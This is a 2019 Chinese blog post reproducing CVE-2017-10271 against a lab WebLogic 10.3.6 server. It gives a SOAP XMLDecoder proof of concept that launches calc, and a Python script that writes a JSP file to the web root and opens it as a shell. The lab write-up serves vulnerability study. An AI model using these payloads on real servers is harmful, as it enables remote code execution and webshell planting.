---
title: WebLogic WLS组件漏洞复现
date: 2019-08-6 15:20:00
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - 漏洞
    - 复现
    - WebLogic WLS
    - 中间件
---
# 0x01 漏洞概述

漏洞编号：CVE-2017-10271

漏洞描述：
Weblogic的WLS Security组件对外提供webservice服务，
其中使用了XMLDecoder来解析用户传入的XML数据，
在解析的过程中出现反序列化漏洞，导致可执行任意命令。

受影响WebLogic版本：
* 10.3.6.0.0
* 12.1.3.0.0
* 12.2.1.1.0
* 12.2.1.2.0

***
# 0x02 环境搭建
## 复现环境
攻击机：Windows 10 1903 x64
靶   机：Windows server 2008 R2 x64

## 漏洞环境搭建
### 靶机配置
安装`jdk1.8.0_191`（路径不要带有空格）,并配置环境变量
安装 [WebLogic Server 10.3.6](https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-main-097127.html)
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806171919.png)
详细安装过程参考：[webLogic10.3.6安装、配置图解](https://wenku.baidu.com/view/938a7a56f5335a8102d220d0.html)

输入配置管理员用户名和口令时设置的用户名和口令之后，
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172423.png)

使用攻击机访问  `http://靶机ip:7001/wls-wsat/CoordinatorPortType`
如出现如下界面，则搭建成功
**（注意：要把靶机上的防火墙关闭）**
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172734.png)

# 0x03 漏洞利用

## POC
```
<soapenv:Envelope     xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
       <work:WorkContext    xmlns:work="http://bea.com/2004/06/soap/workarea/">
           <java      version="1.8" class="java.beans.XMLDecoder">
               <void     class="java.lang.ProcessBuilder">
                    <array    class="java.lang.String" length="3">
                        <void     index="0">
                           <string>calc</string>
                        </void>
                        <void     index="1">
                            <string></string>
                        </void>
                        <void     index="2">
                            <string> </string>
                        </void>
                    </array>
                <void     method="start"/></void>
           </java>
       </work:WorkContext>
   </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
```

攻击机访问 `http://靶机ip:7001/wls-wsat/CoordinatorPortType` 
使用Burp Suite抓包，发送到Repeater
使用post方法发送下方POC，并添加Content-Type:text/xml，把Cache-Control修改为no-cache
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173735.png)

返回状态码 500，进入靶机查看，弹出计算机，执行calc命令成功

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173856.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806174012.png)

## EXP
```
#! -*- coding:utf-8 -*-
import requests
 
url = "http://192.168.159.138:7001/wls-wsat/CoordinatorPortType"
xml = '''
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
     <soapenv:Header>
     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
     <java><java version="1.4.0" class="java.beans.XMLDecoder">
     <object class="java.io.PrintWriter"> 
     <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
     <void method="println"><string>
     <![CDATA[
 <% out.print("test"); %>
     ]]>
     </string>
     </void>
     <void method="close"/>
     </object></java></java>
     </work:WorkContext>
     </soapenv:Header>
    <soapenv:Body/>
 </soapenv:Envelope>
'''
r =requests.post(url,headers={'Content-Type':'text/xml','Cache-Control':'no-cache'},data=xml)
print r.status_code

print r.text
```
(记得修改python文件里面的ip地址)
直接运行 `python2 CVE-2017-10271.py` 写入一句话

访问shell
`http://靶机ip:7001/bea_wls_internal/test.jsp`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806190652.png)

# 参考文章
[WebLogic WLS组件漏洞复现](https://www.freebuf.com/vuls/158247.html)
[Weblogic(CVE-2017-10271)漏洞复现](https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html)